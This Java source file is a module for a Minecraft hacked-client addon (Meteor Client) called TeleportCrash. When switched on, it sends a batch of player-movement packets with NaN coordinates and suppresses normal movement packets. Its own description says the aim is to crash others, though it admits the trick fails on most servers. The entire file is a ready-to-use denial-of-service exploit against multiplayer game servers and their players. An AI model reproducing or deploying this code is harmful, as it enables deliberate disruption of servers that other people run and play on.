package de.qwqu.qma.modules;

import de.qwqu.qma.Addon;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class TeleportCrash extends Module {
  private final SettingGroup sgGeneral = settings.getDefaultGroup();

  private PlayerMoveC2SPacket packet;

  private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
      .name("packet-count")
      .description("The amount of packets to send.")
      .defaultValue(5)
      .noSlider()
      .build());

  private final Setting<Boolean> useX = sgGeneral.add(new BoolSetting.Builder()
      .name("use-x")
      .description("Set X to NaN.")
      .defaultValue(true)
      .build());

  private final Setting<Boolean> useY = sgGeneral.add(new BoolSetting.Builder()
      .name("use-y")
      .description("Set Y to NaN.")
      .defaultValue(true)
      .build());

  private final Setting<Boolean> useZ = sgGeneral.add(new BoolSetting.Builder()
      .name("use-z")
      .description("Set Z to NaN.")
      .defaultValue(true)
      .build());

  public TeleportCrash() {
    super(Addon.CATEGORY, "teleport-crash",
        "Sends funny NaN position packets to crash others (doesn't work on most servers).");
  }

  @EventHandler
  public void onSend(PacketEvent.Send event) {
    if (!(event.packet instanceof PlayerMoveC2SPacket packet))
      return;

    if (packet != this.packet) {
      event.cancel();
    }
  }

  @Override
  public void onActivate() {
    final double x = useX.get() ? Double.NaN : 69;
    final double y = useY.get() ? Double.NaN : 420;
    final double z = useZ.get() ? Double.NaN : 1337;

    packet = new PlayerMoveC2SPacket.PositionAndOnGround(x, y, z, mc.player.isOnGround(), mc.player.horizontalCollision);

    for (int i = 0; i < packets.get(); i++) {
      mc.getNetworkHandler().sendPacket(packet);
    }

    toggle();
  }
}
